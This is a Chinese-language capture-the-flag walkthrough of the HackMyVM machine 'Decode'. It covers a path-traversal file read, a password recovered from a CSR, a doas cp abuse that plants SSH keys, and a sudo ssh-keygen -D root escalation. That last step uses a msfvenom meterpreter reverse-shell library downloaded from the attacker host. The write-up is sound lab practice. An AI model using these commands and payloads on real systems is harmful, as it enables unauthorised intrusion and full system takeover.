# Decode

2025.02.06 https://hackmyvm.eu/machines/machine.php?vm=Decode

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

先访问 web 80 看看，http://192.168.5.40/robots.txt 显示了一些目录:

```
User-agent: decode
Disallow: /encode/

User-agent: *
Allow: /
Allow: /decode
Allow: ../
Allow: /index
Allow: .shtml
Allow: /lfi../
Allow: /etc/
Allow: passwd
Allow: /usr/
Allow: share
Allow: /var/www/html/
Allow: /cgi-bin/
Allow: decode.sh
```

使用 bp 抓包，修改 user-agent 为 decode，尝试访问 /encode/ 但是显示 404。访问http://192.168.5.40/decode 会在结尾自动添加/，同时根据 robots.txt 中的提示/lfi../，这里可能存在目录穿越。

http://192.168.5.40/decode/ 以此目录为基础 gobuster 再次进行扫描，发现了更多新的可访问的内容，发现能读取到一些系统内的文件。

http://192.168.5.40/decode/passwd 发现了登陆用户:

```
root:x:0:0:root:/root:/bin/bash
...
steve:$y$j9T$gbohHcbFkUEmW0d3ZeUx40$Xa/DJJdFujIezo5lg9PDmswZH32cG6kAWP.crcqrqo/:1001:1001::/usr/share:/bin/bash
decoder:x:1002:1002::/home/decoder:/usr/sbin/nologin
ajneya:x:1003:1003::/home/ajneya:/bin/bash
```

但是这个 hash 没有解密出来，继续看上面的 robots.txt 中的信息，经过测试，发现 curl http://192.168.5.40/decode../etc/passwd 也能访问到 passwd 文件。

如果以 http://192.168.5.40/decode../ 为基础，后面添加系统中的文件，就能访问其内容。

在组合 robots.txt 中的其他目录，curl http://192.168.5.40/cgi-bin/decode.sh 发现可以看到 ls 的执行效果，但是没什么用。

steve 的 home 目录在/usr/share ，gobuster 再次扫描，看看里面能找到什么文件。经过扫描发现 curl http://192.168.5.40/decode../usr/share/.bash_history 其显示内容为 rm -rf /usr/share/ssl-cert/decode.csr 查看这个文件 curl http://192.168.5.40/decode../usr/share/ssl-cert/decode.csr 得到其内容：

```
-----BEGIN CERTIFICATE REQUEST-----
MIIDAzCCAesCAQAwSDERMA8GA1UEAwwISGFja015Vk0xDzANBgNVBAgMBmRlY29k
ZTEPMA0GA1UEBwwGZGVjb2RlMREwDwYDVQQKDAhIYWNrTXlWTTCCASIwDQYJKoZI
hvcNAQEBBQADggEPADCCAQoCggEBANnSG9vEEGPRgDA/cT6NT3sMKsi6dLhKwRgy
PcRpRt1TO63kpY2PxNSgOPpydjUm34nwghy5lPL4+GBXoNOHMhQI1hUVqZXmuFB8
+DCETqXNfV5JnTRMG5tr2m4vV1HNTH+/GUueBm5R/ERu69n2xMADs4nEL3iRjOO/
19sYZIj+ZDaN3MouyqrprWy9PBwKf2VTy4prJh6nTEVSV8oRRtd+nOxfEG6890+P
lF6s0XDpv8V001aiJWSceYPIikvKXaVy45h3JoYzWsQzt3b1R22DuPjAOQ3AvZbp
V68lkF+S1rIa7gsb8oeZI16yPz+GEPVvXGzLyIYhDixdxOCFZaECAwEAAaB2MBkG
CSqGSIb3DQEJBzEMDAppNG1EM2MwZDNyMFkGCSqGSIb3DQEJDjFMMEowDgYDVR0P
AQH/BAQDAgWgMCAGA1UdJQEB/wQWMBQGCCsGAQUFBwMBBggrBgEFBQcDAjAWBgNV
HREEDzANggtoYWNrbXl2bS5ldTANBgkqhkiG9w0BAQsFAAOCAQEAO73W3pTMqSm2
A37vepuR4F3ycnFKdFyRhk1rtO1LE9OWOI3bQ7kW0wIFuRaqFONsG/mvGFgEfRR8
xpgSYmnzWJQ0nTOtGi6d7F0dFFmYIXe75+6QYM2ZwAYf3lW+HRKLXhh5FMeoXJHo
eU64o9tFdhWxcB1OLAGEG9MI6AhN62ZTrKwMq13/PIteoPAEnlVgBidxQxUVHQfO
EwMP38jzm+HESbZsNVjX4RQjtvBUAKQUTBRYuS02QqqC5ajHz0RWaGgrGIyKrip5
yRjgsjxtmadaetxSasIg5tsjSFGyyVVPsdY4umAUUm+dSobruxcyXuxXIgn27Z7M
h97It2ELpw==
-----END CERTIFICATE REQUEST-----
```

使用 openssl req -in mycsr.csr -noout -text ，得到解码后的内容为，得到了 steve 用户的密码：

```
Attributes:
    challengePassword        :i4mD3c0d3r
```

登陆 steve/i4mD3c0d3r ssh， sudo -l 发现: `(decoder) NOPASSWD: /usr/bin/openssl enc *, /usr/bin/tee` 但是没什么作用。

看看 suid，发现/usr/bin/doas，查看其配置文件：

```
steve@decode:/home/ajneya$ cat /etc/doas.conf
permit nopass steve as ajneya cmd cp
```

允许 steve 以 ajneya 身份执行 cp 命令，可以生成公钥，将其放到 /home/ajneya/.ssh/authorized_keys 中:

```
cd ~
ssh-keygen
cp id_rsa.pub id_rsa.b
chmod +r id_rsa.b
mkdir -p /tmp/b/.ssh
cp id_rsa.b /tmp/b/.ssh/authorized_keys
doas -u ajneya cp -r /tmp/b/.ssh /home/ajneya/
ssh ajneya@192.168.5.40
```

登陆后，得到了 user flag:

```
ajneya@decode:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

sudo -l 发现：

```
(root) NOPASSWD: /usr/bin/ssh-keygen * /opt/*
```

GTFOBin 中提示:

```
sudo ssh-keygen -D ./lib.so
```

使用 msf 制作 so 文件，进行反弹：

```
msfvenom LHOST=192.168.5.3 LPORT=8888 -p linux/x86/meterpreter/reverse_tcp -f elf-so > lib.so
```

将 so 文件下载到目标机器的/tmp 文件夹中:

```
cd /tmp
wget http://192.168.5.3/z/lib.so
chmod 777 lib.so
sudo -u root /usr/bin/ssh-keygen -D /opt/../tmp/lib.so
```

执行后，得到反弹的 meterpreter，最终得到 root flag:

```
cat root.txt
63a9f0ea7bb98050796b649e85481845
```
